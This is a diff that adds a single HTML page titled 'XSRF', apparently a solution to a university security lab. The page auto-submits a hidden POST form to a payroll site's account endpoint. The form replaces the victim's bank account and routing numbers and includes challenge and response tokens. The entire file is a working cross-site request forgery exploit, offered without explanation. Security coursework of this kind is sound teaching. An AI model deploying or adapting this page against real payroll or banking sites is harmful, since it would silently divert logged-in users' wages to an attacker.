@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSRF</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form action="http://payroll.gatech.edu/account.php" method="POST">
+    <!--
+      Your exploits here
+      You may also want to change some form attributes
+    -->
+    <input type="number" name="account" value="1478554547" />
+    <input type="number" name="routing" value="3756691324" />
+    <input type="hidden" name="VGFyZ2V0MUZhbGwyMDIwLVRyaWNrTG9nZ2VkSW5Vc2Vycw" value="VGFyZ2V0MUZhbGwyMDIwLVRyaWNrTG9nZ2VkSW5Vc2Vycw">
+    <input id="varId" type="hidden" name="varId" value="42" />
+    <input type="hidden" name="response" value="52618" />
+    <input type="hidden" name="challenge" value="1" />
+    <input type="hidden" name="action" value="save" />
+    </form>
+  </body>
+</html>
